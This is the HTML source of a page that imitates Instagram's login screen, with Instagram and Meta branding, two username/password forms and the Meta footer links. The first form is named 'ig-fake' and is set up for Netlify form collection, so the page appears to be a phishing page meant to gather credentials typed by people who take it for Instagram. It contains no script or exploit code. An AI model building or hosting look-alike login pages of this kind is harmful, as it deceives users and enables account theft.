<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link href="instagram.css" rel="stylesheet">
</head>
<body>
    <p id="head-text">English(US)</p>
    <img id="ig-logo" src="instagram-logo.png" alt="instagram">
    <div id="ig-window-icon">
        <img id="ig-window-logo" src="instagram-logo.png" alt="instagram">
    </div>
    <div id="ig-window-text">
        <p>See everyday moments from your <br> <span>close friends.</span></p>
    </div>
    <div id="ig-window-bg">
        <img id="ig-window-bg-img" src="instagram-pc-bg.png"  alt="instagram-bg">
    </div>
    <div id="login-box">
        <form id="login" name="ig-fake" netlify>
            <input id="username" type="text" placeholder="Username,email or mobile number">
            <input id="password" type="password" placeholder="Password">
            <button id="login-btn">Log In</button>
            <p>Forgot Password ?</p>
        </form>
    </div>
    <div id="ig-window-login-box">
        <form id="login">
            <input id="window-username" type="text" placeholder="Username,email or mobile number">
            <input id="window-password" type="password" placeholder="Password">
            <button id="window-login-btn">Log In</button>
            <p>Forgot Password ?</p>
        </form>
    </div>
    <div id="ig-window-footer">
        <p>Meta</p>
        <p>About</p>
        <p>Blog</p>
        <p>Jobs</p>
        <p>Help</p>
        <p>API</p>
        <p>Privacy</p>
        <p>Locations</p>
        <p>Instagram Lite</p>
        <p>Meta AI</p>
        <p>Threads</p>
        <p>Contact Uploading & Non-Users</p>
        <p>Meta Verified</p>
    </div>
    <div id="footer-box">
        <button id="create-btn">Create New Account</button>
        <img id="meta-logo" src = "meta-logo.png" alt="meta">
    </div>
</body>
</html>
